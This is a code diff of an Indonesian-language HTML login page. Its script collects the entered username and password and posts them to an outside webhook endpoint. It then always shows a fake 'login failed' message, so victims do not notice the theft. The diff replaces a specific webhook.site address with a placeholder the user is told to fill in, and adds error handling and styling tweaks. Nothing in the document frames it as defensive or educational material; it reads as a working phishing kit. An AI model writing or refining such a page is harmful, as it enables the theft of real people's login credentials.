@@ -19,6 +19,8 @@
       padding: 30px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       border-radius: 8px;
+      max-width: 300px;
+      width: 100%;
     }
 
     input {
@@ -37,6 +39,7 @@
       border: none;
       border-radius: 4px;
       width: 100%;
+      cursor: pointer;
     }
   </style>
 </head>
@@ -51,24 +54,31 @@
   </div>
 
   <script>
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', async (e) => {
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // Ganti URL ini dengan endpoint kamu
-      const endpoint = "https://webhook.site/603c4d20-de49-4763-a148-9f9508372528"; 
+      const endpoint = "YOUR_WEBHOOK_URL"; // Ganti dengan Webhook.site URL milikmu
 
-      await fetch(endpoint, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ username, password })
-      });
+      const formData = new URLSearchParams();
+      formData.append('username', username);
+      formData.append('password', password);
 
-      alert("Login gagal. Silakan coba lagi.");
+      try {
+        await fetch(endpoint, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: formData.toString()
+        });
+
+        alert("Login gagal. Silakan coba lagi.");
+      } catch (error) {
+        console.error('Error sending data:', error);
+        alert("Terjadi kesalahan saat mengirim data.");
+      }
     });
   </script>
 </body>
